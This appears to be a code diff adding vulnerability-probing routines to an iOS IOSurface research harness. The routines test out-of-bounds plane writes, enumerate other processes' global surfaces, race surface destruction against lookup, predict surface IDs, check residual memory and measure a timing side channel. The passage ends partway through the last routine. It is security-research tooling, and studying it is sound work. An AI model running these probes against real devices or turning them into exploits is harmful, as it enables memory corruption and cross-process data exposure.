@@ -5264,3 +5264,807 @@ void iosurface_research_port_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         }
     });
 }
+
+#pragma mark - Probe 25: Phantom Plane Exploit
+
+void iosurface_research_phantom_plane(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"PHANTOM: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"PHANTOM: Starting phantom plane exploit");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            typedef size_t (*ISR_PlaneCountFn)(IOSurfaceRef);
+            typedef void * (*ISR_PlaneBaseFn)(IOSurfaceRef, size_t);
+            typedef size_t (*ISR_PlaneDimFn)(IOSurfaceRef, size_t);
+            ISR_PlaneCountFn getPlaneCount = (ISR_PlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");
+            ISR_PlaneBaseFn getPlaneBase = (ISR_PlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
+            ISR_PlaneDimFn getPlaneBPR = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerRowOfPlane");
+            ISR_PlaneDimFn getPlaneW = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetWidthOfPlane");
+            ISR_PlaneDimFn getPlaneH = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetHeightOfPlane");
+
+            if (!getPlaneCount || !getPlaneBase) {
+                log(@"PHANTOM: Missing plane functions");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            // Phase A — BGRA with 2 planes (phantom plane write)
+            log(@"PHANTOM: Phase A — BGRA with phantom second plane");
+            NSDictionary *plane0 = @{
+                @"IOSurfacePlaneWidth": @64,
+                @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4,
+                @"IOSurfacePlaneOffset": @0,
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *plane1 = @{
+                @"IOSurfacePlaneWidth": @64,
+                @"IOSurfacePlaneHeight": @32,
+                @"IOSurfacePlaneBytesPerElement": @4,
+                @"IOSurfacePlaneOffset": @16384,
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *bgraParams = @{
+                @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfaceAllocSize": @(16384 + 8192),
+                @"IOSurfacePlaneInfo": @[plane0, plane1]
+            };
+
+            IOSurfaceRef bgraSurf = sym.create((__bridge CFDictionaryRef)bgraParams);
+            if (bgraSurf) {
+                size_t pc = getPlaneCount(bgraSurf);
+                log([NSString stringWithFormat:@"PHANTOM: BGRA+2planes created, planeCount=%zu allocSize=%zu",
+                     pc, sym.getAllocSize(bgraSurf)]);
+
+                sym.lock(bgraSurf, 0, NULL);
+                void *p0base = getPlaneBase(bgraSurf, 0);
+                void *p1base = getPlaneBase(bgraSurf, 1);
+
+                if (p0base && p1base) {
+                    memset(p0base, 0xAA, 16384);
+                    memset(p1base, 0xBB, 8192);
+
+                    uint8_t *p0check = (uint8_t *)p0base;
+                    uint8_t *p1check = (uint8_t *)p1base;
+                    BOOL p0ok = (p0check[0] == 0xAA && p0check[16383] == 0xAA);
+                    BOOL p1ok = (p1check[0] == 0xBB && p1check[8191] == 0xBB);
+                    log([NSString stringWithFormat:@"PHANTOM: Plane0 write OK=%d, Plane1 write OK=%d", p0ok, p1ok]);
+
+                    if (p0check[16383] == 0xBB) {
+                        anomalies++;
+                        log(@"PHANTOM: ANOMALY — plane 1 write corrupted end of plane 0!");
+                    }
+
+                    // CG render test: create context from plane 0 base, see if CG sees only plane 0
+                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                    CGContextRef ctx = CGBitmapContextCreate(p0base, 64, 64, 8, 256,
+                        cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                    if (ctx) {
+                        CGImageRef img = CGBitmapContextCreateImage(ctx);
+                        if (img) {
+                            size_t imgW = CGImageGetWidth(img);
+                            size_t imgH = CGImageGetHeight(img);
+                            log([NSString stringWithFormat:@"PHANTOM: CG render from plane0 — %zux%zu", imgW, imgH]);
+                            CGImageRelease(img);
+                        }
+                        CGContextRelease(ctx);
+                    }
+                    CGColorSpaceRelease(cs);
+                } else {
+                    log([NSString stringWithFormat:@"PHANTOM: Plane bases — p0=%p p1=%p", p0base, p1base]);
+                }
+                sym.unlock(bgraSurf, 0, NULL);
+                CFRelease(bgraSurf);
+            } else {
+                log(@"PHANTOM: Kernel rejected BGRA+2planes");
+            }
+
+            if (isr_stopped()) goto phantom_done;
+
+            // Phase B — 420v with 3 planes (extra chroma phantom)
+            log(@"PHANTOM: Phase B — 420v with phantom third plane");
+            {
+                NSDictionary *yPlane = @{
+                    @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                    @"IOSurfacePlaneBytesPerElement": @1, @"IOSurfacePlaneOffset": @0,
+                    @"IOSurfacePlaneBytesPerRow": @64
+                };
+                NSDictionary *cbcrPlane = @{
+                    @"IOSurfacePlaneWidth": @32, @"IOSurfacePlaneHeight": @32,
+                    @"IOSurfacePlaneBytesPerElement": @2, @"IOSurfacePlaneOffset": @4096,
+                    @"IOSurfacePlaneBytesPerRow": @64
+                };
+                NSDictionary *phantomPlane = @{
+                    @"IOSurfacePlaneWidth": @32, @"IOSurfacePlaneHeight": @32,
+                    @"IOSurfacePlaneBytesPerElement": @1, @"IOSurfacePlaneOffset": @6144,
+                    @"IOSurfacePlaneBytesPerRow": @32
+                };
+                NSDictionary *yuvParams = @{
+                    @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+                    @"IOSurfacePixelFormat": @(0x34323076), // '420v'
+                    @"IOSurfaceBytesPerElement": @1,
+                    @"IOSurfaceBytesPerRow": @64,
+                    @"IOSurfaceAllocSize": @(7168),
+                    @"IOSurfacePlaneInfo": @[yPlane, cbcrPlane, phantomPlane]
+                };
+
+                IOSurfaceRef yuvSurf = sym.create((__bridge CFDictionaryRef)yuvParams);
+                if (yuvSurf) {
+                    size_t pc = getPlaneCount(yuvSurf);
+                    size_t allocSz = sym.getAllocSize(yuvSurf);
+                    log([NSString stringWithFormat:@"PHANTOM: 420v+3planes created — planes=%zu alloc=%zu", pc, allocSz]);
+
+                    sym.lock(yuvSurf, 0, NULL);
+                    void *phantomBase = getPlaneBase(yuvSurf, 2);
+                    void *yBase = getPlaneBase(yuvSurf, 0);
+                    if (phantomBase && yBase) {
+                        memset(phantomBase, 0xDD, 1024);
+                        uint8_t *scanBase = (uint8_t *)yBase;
+                        BOOL foundDD = NO;
+                        for (size_t i = 6144; i < allocSz && i < 7168; i++) {
+                            if (scanBase[i] == 0xDD) { foundDD = YES; break; }
+                        }
+                        if (foundDD) {
+                            anomalies++;
+                            log(@"PHANTOM: ANOMALY — phantom plane data accessible within allocSize bounds!");
+                        } else {
+                            log(@"PHANTOM: Phantom plane data not found via linear scan");
+                        }
+                    } else {
+                        log([NSString stringWithFormat:@"PHANTOM: Plane bases — y=%p phantom=%p", yBase, phantomBase]);
+                    }
+                    sym.unlock(yuvSurf, 0, NULL);
+                    CFRelease(yuvSurf);
+                } else {
+                    log(@"PHANTOM: Kernel rejected 420v+3planes");
+                }
+            }
+
+            if (isr_stopped()) goto phantom_done;
+
+            // Phase C — Plane boundary overwrite
+            log(@"PHANTOM: Phase C — plane boundary overwrite test");
+            {
+                IOSurfaceRef bSurf = sym.create((__bridge CFDictionaryRef)bgraParams);
+                if (bSurf) {
+                    sym.lock(bSurf, 0, NULL);
+                    void *bp0 = getPlaneBase(bSurf, 0);
+                    void *bp1 = getPlaneBase(bSurf, 1);
+                    if (bp0 && bp1) {
+                        memset(bp0, 0x00, 16384);
+                        memset(bp1, 0x00, 8192);
+                        // Write 0xFF to last 64 bytes of plane 0
+                        memset((uint8_t *)bp0 + 16384 - 64, 0xFF, 64);
+                        // Read first 64 bytes of plane 1
+                        uint8_t *p1start = (uint8_t *)bp1;
+                        int crossCount = 0;
+                        for (int i = 0; i < 64; i++) {
+                            if (p1start[i] == 0xFF) crossCount++;
+                        }
+                        if (crossCount > 0) {
+                            anomalies++;
+                            log([NSString stringWithFormat:
+                                @"PHANTOM: ANOMALY — %d/64 bytes leaked from plane 0 end to plane 1 start!", crossCount]);
+                        } else {
+                            ptrdiff_t gap = (uint8_t *)bp1 - (uint8_t *)bp0;
+                            log([NSString stringWithFormat:
+                                @"PHANTOM: No cross-plane leak — plane gap=%td bytes (offset diff=16384)", gap]);
+                            if (gap == 16384) {
+                                log(@"PHANTOM: Planes are CONTIGUOUS in memory — writes at boundary adjacent");
+                                anomalies++;
+                            }
+                        }
+                    }
+                    sym.unlock(bSurf, 0, NULL);
+                    CFRelease(bSurf);
+                }
+            }
+
+            if (isr_stopped()) goto phantom_done;
+
+            // Phase D — Render confusion: CG context that overflows plane 0 into plane 1
+            log(@"PHANTOM: Phase D — render overflow into phantom plane");
+            {
+                IOSurfaceRef dSurf = sym.create((__bridge CFDictionaryRef)bgraParams);
+                if (dSurf) {
+                    sym.lock(dSurf, 0, NULL);
+                    void *dp0 = getPlaneBase(dSurf, 0);
+                    void *dp1 = getPlaneBase(dSurf, 1);
+                    if (dp0 && dp1) {
+                        // Fill plane 0 with red (BGRA = 0x00,0x00,0xFF,0xFF)
+                        uint32_t red = 0xFF0000FF;
+                        uint32_t green = 0x00FF00FF;
+                        uint32_t *p0px = (uint32_t *)dp0;
+                        for (int i = 0; i < 64*64; i++) p0px[i] = red;
+                        uint32_t *p1px = (uint32_t *)dp1;
+                        for (int i = 0; i < 64*32; i++) p1px[i] = green;
+
+                        // Create CG context spanning 96 rows (64 plane0 + 32 into plane1)
+                        ptrdiff_t gap = (uint8_t *)dp1 - (uint8_t *)dp0;
+                        if (gap == 16384) {
+                            CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
+                            CGContextRef ctx2 = CGBitmapContextCreate(dp0, 64, 96, 8, 256,
+                                cs2, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                            if (ctx2) {
+                                CGImageRef img2 = CGBitmapContextCreateImage(ctx2);
+                                if (img2) {
+                                    // Read pixel at row 65 (0-indexed), which should be in plane 1 zone
+                                    CFDataRef pixData = CGDataProviderCopyData(CGImageGetDataProvider(img2));
+                                    if (pixData) {
+                                        const uint8_t *bytes = CFDataGetBytePtr(pixData);
+                                        size_t bpr = CGImageGetBytesPerRow(img2);
+                                        // Row 65, col 0 offset
+                                        size_t off = 65 * bpr;
+                                        if (off + 4 <= (size_t)CFDataGetLength(pixData)) {
+                                            uint32_t pxVal;
+                                            memcpy(&pxVal, bytes + off, 4);
+                                            log([NSString stringWithFormat:
+                                                @"PHANTOM: Row 65 pixel = 0x%08X (green=0x00FF00FF)", pxVal]);
+                                            if (pxVal == green) {
+                                                anomalies++;
+                                                log(@"PHANTOM: ANOMALY — CG rendered plane 1 data via overflow context!");
+                                            } else if (pxVal != 0 && pxVal != red) {
+                                                anomalies++;
+                                                log(@"PHANTOM: ANOMALY — unexpected pixel data in overflow region!");
+                                            }
+                                        }
+                                        CFRelease(pixData);
+                                    }
+                                    CGImageRelease(img2);
+                                }
+                                CGContextRelease(ctx2);
+                            } else {
+                                log(@"PHANTOM: CG rejected oversized context creation");
+                            }
+                            CGColorSpaceRelease(cs2);
+                        } else {
+                            log([NSString stringWithFormat:@"PHANTOM: Planes not contiguous (gap=%td), skip overflow test", gap]);
+                        }
+                    }
+                    sym.unlock(dSurf, 0, NULL);
+                    CFRelease(dSurf);
+                }
+            }
+
+        phantom_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"PHANTOM: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+
+            NSDictionary *results = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-PhantomPlane-checkpoint.json", results);
+            isr_unload(&sym);
+            done(results);
+        }
+    });
+}
+
+#pragma mark - Probe 26: Global Surface Spy
+
+void iosurface_research_global_spy(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"GLOBALSPY: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"GLOBALSPY: Starting global surface spy analysis");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            typedef void (*ISR_SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*ISR_CopyValueFn)(IOSurfaceRef, CFStringRef);
+            ISR_SetValueFn setValue = (ISR_SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            ISR_CopyValueFn copyValue = (ISR_CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            if (!setValue) {
+                log(@"GLOBALSPY: Missing IOSurfaceSetValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            // Phase A — Global surface creation and sentinel verification
+            log(@"GLOBALSPY: Phase A — global surface with sentinel data");
+            NSDictionary *params = isr_default_surface_params(64, 64);
+            IOSurfaceRef surfA = sym.create((__bridge CFDictionaryRef)params);
+            if (!surfA) {
+                log(@"GLOBALSPY: Failed to create surface");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            IOSurfaceID idA = sym.getID(surfA);
+            setValue(surfA, CFSTR("IOSurfaceIsGlobal"), (__bridge CFTypeRef)@YES);
+            log([NSString stringWithFormat:@"GLOBALSPY: Created global surface id=%u", idA]);
+
+            sym.lock(surfA, 0, NULL);
+            void *baseA = sym.getBase(surfA);
+            if (baseA) {
+                uint32_t sentinel = 0xDEADBEEF;
+                uint32_t *px = (uint32_t *)baseA;
+                for (int i = 0; i < 64*64; i++) px[i] = sentinel;
+            }
+            sym.unlock(surfA, 0, NULL);
+
+            IOSurfaceRef lookupA = sym.lookup(idA);
+            if (lookupA) {
+                sym.lock(lookupA, 0, NULL);
+                void *lBase = sym.getBase(lookupA);
+                if (lBase) {
+                    uint32_t val = ((uint32_t *)lBase)[0];
+                    log([NSString stringWithFormat:@"GLOBALSPY: Lookup OK — first word=0x%08X (expected 0xDEADBEEF)", val]);
+                    if (val == 0xDEADBEEF) {
+                        log(@"GLOBALSPY: Global surface sentinel verified via lookup");
+                    }
+                }
+                sym.unlock(lookupA, 0, NULL);
+                CFRelease(lookupA);
+            } else {
+                log(@"GLOBALSPY: Lookup failed — surface not globally visible");
+            }
+
+            if (isr_stopped()) goto globalspy_done;
+
+            // Phase B — Global surface data tampering via second reference
+            log(@"GLOBALSPY: Phase B — data tampering via second reference");
+            {
+                IOSurfaceRef refB = sym.lookup(idA);
+                if (refB) {
+                    sym.lock(refB, 0, NULL);
+                    void *bBase = sym.getBase(refB);
+                    if (bBase) {
+                        uint32_t *bpx = (uint32_t *)bBase;
+                        for (int i = 0; i < 64*64; i++) bpx[i] = 0xBBBBBBBB;
+                    }
+                    sym.unlock(refB, 0, NULL);
+
+                    // Read through original reference A
+                    sym.lock(surfA, 0, NULL);
+                    void *aBase = sym.getBase(surfA);
+                    if (aBase) {
+                        uint32_t aVal = ((uint32_t *)aBase)[0];
+                        log([NSString stringWithFormat:@"GLOBALSPY: Original ref reads 0x%08X after tamper via lookup ref", aVal]);
+                        if (aVal == 0xBBBBBBBB) {
+                            anomalies++;
+                            log(@"GLOBALSPY: ANOMALY — data tampered! Lookup reference shares memory with creator");
+                        }
+                    }
+                    sym.unlock(surfA, 0, NULL);
+                    CFRelease(refB);
+                }
+            }
+
+            if (isr_stopped()) goto globalspy_done;
+
+            // Phase C — Global surface enumeration: scan for foreign surfaces
+            log(@"GLOBALSPY: Phase C — scanning for foreign global surfaces");
+            {
+                // Create 10 global surfaces to establish our ID range
+                IOSurfaceRef ourSurfs[10];
+                IOSurfaceID ourIDs[10];
+                for (int i = 0; i < 10; i++) {
+                    ourSurfs[i] = sym.create((__bridge CFDictionaryRef)params);
+                    if (ourSurfs[i]) {
+                        ourIDs[i] = sym.getID(ourSurfs[i]);
+                        setValue(ourSurfs[i], CFSTR("IOSurfaceIsGlobal"), (__bridge CFTypeRef)@YES);
+                    } else {
+                        ourIDs[i] = 0;
+                    }
+                }
+
+                IOSurfaceID maxID = 0;
+                for (int i = 0; i < 10; i++) {
+                    if (ourIDs[i] > maxID) maxID = ourIDs[i];
+                }
+
+                uint32_t foreignCount = 0;
+                uint32_t scanned = 0;
+                for (IOSurfaceID probe = 1; probe <= maxID && !isr_stopped(); probe++) {
+                    BOOL isOurs = NO;
+                    if (probe == idA) isOurs = YES;
+                    for (int i = 0; i < 10 && !isOurs; i++) {
+                        if (probe == ourIDs[i]) isOurs = YES;
+                    }
+                    if (isOurs) continue;
+
+                    scanned++;
+                    IOSurfaceRef foreign = sym.lookup(probe);
+                    if (foreign) {
+                        foreignCount++;
+                        size_t fw = sym.getWidth(foreign);
+                        size_t fh = sym.getHeight(foreign);
+                        size_t fa = sym.getAllocSize(foreign);
+                        log([NSString stringWithFormat:
+                            @"GLOBALSPY: FOREIGN surface id=%u %zux%zu alloc=%zu", probe, fw, fh, fa]);
+                        CFRelease(foreign);
+                    }
+                }
+
+                log([NSString stringWithFormat:@"GLOBALSPY: Scanned %u IDs, found %u foreign surfaces", scanned, foreignCount]);
+                if (foreignCount > 0) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"GLOBALSPY: ANOMALY — %u foreign global surfaces visible!", foreignCount]);
+                }
+
+                for (int i = 0; i < 10; i++) {
+                    if (ourSurfs[i]) CFRelease(ourSurfs[i]);
+                }
+            }
+
+            if (isr_stopped()) goto globalspy_done;
+
+            // Phase D — Global surface + destroy race
+            log(@"GLOBALSPY: Phase D — destroy race on global surface");
+            {
+                IOSurfaceRef raceSurf = sym.create((__bridge CFDictionaryRef)params);
+                if (raceSurf) {
+                    IOSurfaceID raceID = sym.getID(raceSurf);
+                    setValue(raceSurf, CFSTR("IOSurfaceIsGlobal"), (__bridge CFTypeRef)@YES);
+
+                    // Write known dimensions
+                    sym.lock(raceSurf, 0, NULL);
+                    void *rBase = sym.getBase(raceSurf);
+                    if (rBase) memset(rBase, 0xEE, 64 * 64 * 4);
+                    sym.unlock(raceSurf, 0, NULL);
+
+                    __block atomic_uint postDestroyLookups = 0;
+                    __block atomic_uint wrongDimLookups = 0;
+                    __block atomic_bool destroyed = false;
+
+                    dispatch_group_t grp = dispatch_group_create();
+
+                    // Thread 1: destroy after 1ms
+                    dispatch_group_async(grp, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                        usleep(1000);
+                        CFRelease(raceSurf);
+                        atomic_store(&destroyed, true);
+                    });
+
+                    // Thread 2: rapid lookups
+                    dispatch_group_async(grp, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                        uint64_t deadline = mach_absolute_time() + 50000000; // ~50ms
+                        while (mach_absolute_time() < deadline) {
+                            IOSurfaceRef lr = sym.lookup(raceID);
+                            if (lr) {
+                                if (atomic_load(&destroyed)) {
+                                    atomic_fetch_add(&postDestroyLookups, 1);
+                                    size_t w = sym.getWidth(lr);
+                                    if (w != 64) {
+                                        atomic_fetch_add(&wrongDimLookups, 1);
+                                    }
+                                }
+                                CFRelease(lr);
+                            }
+                        }
+                    });
+
+                    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
+
+                    uint32_t pdl = atomic_load(&postDestroyLookups);
+                    uint32_t wdl = atomic_load(&wrongDimLookups);
+                    log([NSString stringWithFormat:
+                        @"GLOBALSPY: Post-destroy lookups=%u, wrong dimensions=%u", pdl, wdl]);
+                    if (pdl > 0) {
+                        anomalies++;
+                        log([NSString stringWithFormat:
+                            @"GLOBALSPY: ANOMALY — %u lookups succeeded after surface destroyed!", pdl]);
+                    }
+                    if (wdl > 0) {
+                        anomalies++;
+                        log(@"GLOBALSPY: ANOMALY — confused lookup returned surface with wrong dimensions!");
+                    }
+                }
+            }
+
+        globalspy_done:;
+            CFRelease(surfA);
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"GLOBALSPY: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+
+            NSDictionary *results = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-GlobalSpy-checkpoint.json", results);
+            isr_unload(&sym);
+            done(results);
+        }
+    });
+}
+
+#pragma mark - Probe 27: ID Oracle Attack
+
+void iosurface_research_id_oracle(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"IDORACLE: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"IDORACLE: Starting ID oracle attack");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+            NSDictionary *params = isr_default_surface_params(64, 64);
+
+            // Phase A — ID prediction accuracy
+            log(@"IDORACLE: Phase A — ID prediction accuracy test");
+            {
+                IOSurfaceID ids[50];
+                for (int i = 0; i < 50; i++) {
+                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
+                    if (s) {
+                        ids[i] = sym.getID(s);
+                        CFRelease(s);
+                    } else {
+                        ids[i] = 0;
+                    }
+                }
+
+                // Determine pattern: check if sequential
+                int32_t delta = (int32_t)ids[1] - (int32_t)ids[0];
+                BOOL consistent = YES;
+                for (int i = 2; i < 50; i++) {
+                    int32_t d = (int32_t)ids[i] - (int32_t)ids[i-1];
+                    if (d != delta) { consistent = NO; break; }
+                }
+
+                IOSurfaceID lastID = ids[49];
+                uint32_t correct = 0;
+                for (int i = 0; i < 20 && !isr_stopped(); i++) {
+                    IOSurfaceID predicted = lastID + delta;
+                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
+                    if (s) {
+                        IOSurfaceID actual = sym.getID(s);
+                        if (actual == predicted) correct++;
+                        lastID = actual;
+                        CFRelease(s);
+                    }
+                }
+
+                double accuracy = correct / 20.0 * 100.0;
+                log([NSString stringWithFormat:@"IDORACLE: Prediction accuracy = %u/20 (%.0f%%) delta=%d consistent=%d",
+                     correct, accuracy, delta, consistent]);
+                if (accuracy > 90.0) {
+                    anomalies++;
+                    log(@"IDORACLE: ANOMALY — ID allocation is >90%% predictable!");
+                }
+            }
+
+            if (isr_stopped()) goto idoracle_done;
+
+            // Phase B — Pre-lookup reservation and residual data attack
+            log(@"IDORACLE: Phase B — residual data after ID reuse");
+            {
+                // Get current ID baseline
+                IOSurfaceRef baseline = sym.create((__bridge CFDictionaryRef)params);
+                IOSurfaceID baseID = sym.getID(baseline);
+                CFRelease(baseline);
+
+                IOSurfaceID predictedN = baseID + 1;
+                // Pre-lookup should fail
+                IOSurfaceRef preLookup = sym.lookup(predictedN);
+                log([NSString stringWithFormat:@"IDORACLE: Pre-lookup ID %u = %s",
+                     predictedN, preLookup ? "EXISTS (unexpected!)" : "NULL (correct)"]);
+                if (preLookup) CFRelease(preLookup);
+
+                // Create surface at predicted ID
+                IOSurfaceRef surfN = sym.create((__bridge CFDictionaryRef)params);
+                IOSurfaceID actualN = sym.getID(surfN);
+                log([NSString stringWithFormat:@"IDORACLE: Predicted=%u actual=%u match=%s",
+                     predictedN, actualN, actualN == predictedN ? "YES" : "NO"]);
+
+                // Write sentinel and destroy
+                sym.lock(surfN, 0, NULL);
+                void *nBase = sym.getBase(surfN);
+                if (nBase) {
+                    uint32_t *npx = (uint32_t *)nBase;
+                    for (int i = 0; i < 64*64; i++) npx[i] = 0xAAAAAAAA;
+                }
+                sym.unlock(surfN, 0, NULL);
+                CFRelease(surfN);
+
+                // Create new surface — check if same ID and if residual data persists
+                IOSurfaceRef surfN2 = sym.create((__bridge CFDictionaryRef)params);
+                IOSurfaceID idN2 = sym.getID(surfN2);
+                log([NSString stringWithFormat:@"IDORACLE: After destroy+create — new ID=%u (reused=%s)",
+                     idN2, idN2 == actualN ? "YES" : "NO"]);
+
+                sym.lock(surfN2, 0, NULL);
+                void *n2Base = sym.getBase(surfN2);
+                if (n2Base) {
+                    uint32_t *n2px = (uint32_t *)n2Base;
+                    int residualCount = 0;
+                    for (int i = 0; i < 64*64; i++) {
+                        if (n2px[i] == 0xAAAAAAAA) residualCount++;
+                    }
+                    log([NSString stringWithFormat:@"IDORACLE: Residual 0xAAAAAAAA pixels = %d/4096", residualCount]);
+                    if (residualCount > 0) {
+                        anomalies++;
+                        log(@"IDORACLE: ANOMALY — residual data persists after destroy+realloc!");
+                    } else {
+                        log(@"IDORACLE: Buffer properly zeroed on realloc");
+                    }
+                }
+                sym.unlock(surfN2, 0, NULL);
+                CFRelease(surfN2);
+            }
+
+            if (isr_stopped()) goto idoracle_done;
+
+            // Phase C — Mass pre-lookup timing side-channel
+            log(@"IDORACLE: Phase C — mass pre-lookup timing side-channel");
+            {
+                // Run 1: Create 100 surfaces WITHOUT pre-lookup
+                uint64_t t1start = mach_absolute_time();
+                for (int i = 0; i < 100; i++) {
+                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
+                    if (s) CFRelease(s);
+                }
+                uint64_t t1end = mach_absolute_time();
+                uint64_t noPreTime = t1end - t1start;
+
+                // Get baseline for prediction
+                IOSurfaceRef bSurf = sym.create((__bridge CFDictionaryRef)params);
+                IOSurfaceID bID = sym.getID(bSurf);
+                CFRelease(bSurf);
+
+                // Pre-lookup 100 predicted IDs
+                for (int i = 1; i <= 100; i++) {
+                    IOSurfaceRef lr = sym.lookup(bID + i);
+                    if (lr) CFRelease(lr);
+                }
+
+                // Run 2: Create 100 surfaces WITH pre-lookup priming
+                uint64_t t2start = mach_absolute_time();
+                for (int i = 0; i < 100; i++) {
+                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
+                    if (s) CFRelease(s);
+                }
+                uint64_t t2end = mach_absolute_time();
+                uint64_t withPreTime = t2end - t2start;
+
+                mach_timebase_info_data_t info;
+                mach_timebase_info(&info);
+                double noPreNs = (double)noPreTime * info.numer / info.denom;
+                double withPreNs = (double)withPreTime * info.numer / info.denom;
+                double ratio = withPreNs / noPreNs;
+
+                log([NSString stringWithFormat:@"IDORACLE: No pre-lookup = %.0fns, with pre-lookup = %.0fns, ratio = %.2fx",
+                     noPreNs, withPreNs, ratio]);
+                if (ratio > 1.5 || ratio < 0.67) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"IDORACLE: ANOMALY — pre-lookup causes %.0f%% timing difference!",
+                         (ratio - 1.0) * 100.0]);
+                } else {
+                    log(@"IDORACLE: No significant timing side-channel from pre-lookup");
+                }
+            }
+
+            if (isr_stopped()) goto idoracle_done;
+
+            // Phase D — Stale reference persistence after destroy
+            log(@"IDORACLE: Phase D — stale reference persistence");
+            {
+                IOSurfaceRef surfD = sym.create((__bridge CFDictionaryRef)params);
+                IOSurfaceID idD = sym.getID(surfD);
+
+                // Get second reference via lookup
+                IOSurfaceRef refB = sym.lookup(idD);
+                log([NSString stringWithFormat:@"IDORACLE: Surface id=%u, refA=%p, refB=%p", idD, surfD, refB]);
+
+                // Write via A
+                sym.lock(surfD, 0, NULL);
+                void *dBase = sym.getBase(surfD);
+                if (dBase) {
+                    uint32_t *dpx = (uint32_t *)dBase;
+                    for (int i = 0; i < 64*64; i++) dpx[i] = 0xCCCCCCCC;
+                }
+                sym.unlock(surfD, 0, NULL);
+
+                // Destroy original reference A
+                CFRelease(surfD);
+
+                // Try to use stale reference B
+                BOOL staleWorks = NO;
+                if (refB) {
+                    kern_return_t kr = sym.lock(refB, 0, NULL);
+                    if (kr == 0) {
+                        void *bBase = sym.getBase(refB);
+                        if (bBase) {
+                            uint32_t val = ((uint32_t *)bBase)[0];
+                            log([NSString stringWithFormat:@"IDORACLE: Stale ref B reads 0x%08X after A destroyed", val]);
+                            if (val == 0xCCCCCCCC) {
+                                staleWorks = YES;
+                                log(@"IDORACLE: Stale reference still has original data — refcount keeps surface alive");
+                            }
+                        }
+                        sym.unlock(refB, 0, NULL);
+                    } else {
+                        log(@"IDORACLE: Stale ref B lock failed — surface properly freed");
+                    }
+
+                    // Create new surface — check if ID reused while B still holds a ref
+                    IOSurfaceRef surfD2 = sym.create((__bridge CFDictionaryRef)params);
+                    IOSurfaceID idD2 = sym.getID(surfD2);
+                    log([NSString stringWithFormat:@"IDORACLE: New surface id=%u (old was %u, reused=%s)",
+                         idD2, idD, idD2 == idD ? "YES" : "NO"]);
+
